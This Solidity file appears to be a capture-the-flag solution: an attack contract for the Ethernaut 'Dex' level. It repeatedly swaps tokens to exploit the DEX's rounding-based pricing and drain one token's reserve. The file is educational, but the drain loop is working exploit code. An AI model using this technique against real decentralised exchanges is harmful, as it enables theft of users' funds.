// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IDex.sol";
import "./interfaces/ISwappableToken.sol";

/**
 * @title Dex Attack (Ethernaut Challenge Level 22 - Dex)
 * @author Emre Tepe (@emretepedev)
 * @notice Attack contract for level 22
 * @custom:ethernaut https://ethernaut.openzeppelin.com/level/0xC084FC117324D7C628dBC41F17CAcAaF4765f49e
 */
contract DexAttack {
    uint256 private constant FROM = 0;
    uint256 private constant TO = 1;
    uint256 private constant MAX_UINT256 = type(uint256).max;

    /*//////////////////////////////////////////////////////////////
                                Attack
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Attack and solve the level
     * @param target Address of target contract
     */
    function attack(IDex target) external {
        ISwappableToken[2] memory tokens = [ISwappableToken(target.token1()), ISwappableToken(target.token2())];

        for (uint256 i; i < tokens.length; ) {
            tokens[i].approve(msg.sender, address(this), MAX_UINT256);

            require(MAX_UINT256 == tokens[i].allowance(msg.sender, address(this)), "Dex: Sender approve failed");

            tokens[i].approve(address(this), address(target), MAX_UINT256);

            require(MAX_UINT256 == tokens[i].allowance(address(this), address(target)), "Dex: Contract approve failed");

            require(
                tokens[i].transferFrom(msg.sender, address(this), tokens[i].balanceOf(msg.sender)),
                "Dex: Token transfer failed"
            );

            unchecked {
                ++i;
            }
        }

        uint256[2] memory balances;
        uint256[2] memory dexBalances;
        uint256 fromIndex = FROM;
        uint256 toIndex = TO;
        while (true) {
            balances = [tokens[fromIndex].balanceOf(address(this)), tokens[toIndex].balanceOf(address(this))];

            dexBalances = [tokens[fromIndex].balanceOf(address(target)), tokens[toIndex].balanceOf(address(target))];

            if (
                dexBalances[TO] <=
                target.getSwapPrice(address(tokens[fromIndex]), address(tokens[toIndex]), balances[FROM])
            ) {
                target.swap(address(tokens[fromIndex]), address(tokens[toIndex]), dexBalances[FROM]);
                break;
            }

            target.swap(address(tokens[fromIndex]), address(tokens[toIndex]), balances[FROM]);

            fromIndex = 1 - fromIndex;
            toIndex = 1 - toIndex;
        }

        require(
            0 == tokens[FROM].balanceOf(address(target)) || 0 == tokens[TO].balanceOf(address(target)),
            "Dex: Attack failed"
        );
    }
}
